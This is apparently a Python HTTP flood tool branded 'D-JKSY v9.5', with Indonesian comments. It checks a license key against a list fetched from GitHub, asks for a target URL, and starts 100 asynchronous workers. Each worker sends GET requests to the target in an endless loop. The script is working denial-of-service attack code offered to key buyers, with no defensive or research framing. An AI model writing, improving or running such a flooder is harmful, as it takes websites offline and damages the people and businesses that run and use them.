import asyncio, aiohttp, requests, time, os, sys
from rich.console import Console
from rich.panel import Panel

console = Console()

async def main():
    # 1. Cek Lisensi dari GitHub kamu
    try:
        r = requests.get("https://raw.githubusercontent.com/iamkhy11/d-jksy/main/keys.txt", timeout=10)
        keys = [k.strip() for k in r.text.splitlines()]
    except:
        console.print("[bold red][!] Gagal terhubung ke server lisensi.[/]")
        return

    os.system('cls' if os.name == 'nt' else 'clear')
    
    # PERBAIKAN: justify dipindah ke console.print, bukan di dalam Panel
    console.print(Panel("[bold white on red] D-JKSY v9.5 BY JOKESKYLS [/]"), justify="center")
    
    key_input = console.input("\n[bold yellow][?][/] Enter License Key: ").strip()
    
    if key_input in keys:
        console.print("[bold green][+][/] Access Granted!")
        
        # 2. Input Target
        url = console.input("[bold cyan][?][/] Target URL (dengan http/https): ")
        console.print(f"[bold red][!][/] Launching Tier S Attack to {url}...")
        
        # Worker serangan (Worker ditingkatkan ke 100 untuk Tier S)
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(100):
                tasks.append(attack_logic(session, url))
            await asyncio.gather(*tasks)
    else:
        console.print("[bold red][!][/] Invalid Key! Contact @nazisme1930")

async def attack_logic(session, url):
    while True:
        try:
            async with session.get(url, timeout=5) as resp:
                # Menampilkan log sederhana agar user tahu script bekerja
                print(f"[*] Packets Sent to {url} | Status: {resp.status}")
        except:
            pass
        await asyncio.sleep(0) # Mencegah CPU overheat
